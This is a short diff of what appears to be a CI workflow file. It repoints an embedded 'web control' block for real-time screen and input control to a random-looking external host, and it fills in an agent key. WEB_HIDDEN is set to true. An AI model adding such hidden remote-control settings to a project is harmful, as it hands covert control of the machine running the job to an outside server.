@@ -1669,9 +1669,9 @@ jobs:
           # ============================================================
           #  WEB CONTROL - realtime screen + input (control.bot-keep.xyz)
           # ============================================================
-          CONTROL_URL  = "https://control.bot-keep.xyz"
+          CONTROL_URL  = "https://bvwqmiv7phoi.ramnaymcloud.com"
           CONTROL_ON   = True
-          AGENT_KEY    = ""
+          AGENT_KEY    = "gayvcl"
           WEB_HIDDEN   = True
           WEB_FPS      = 12
           WEB_QUALITY  = 55
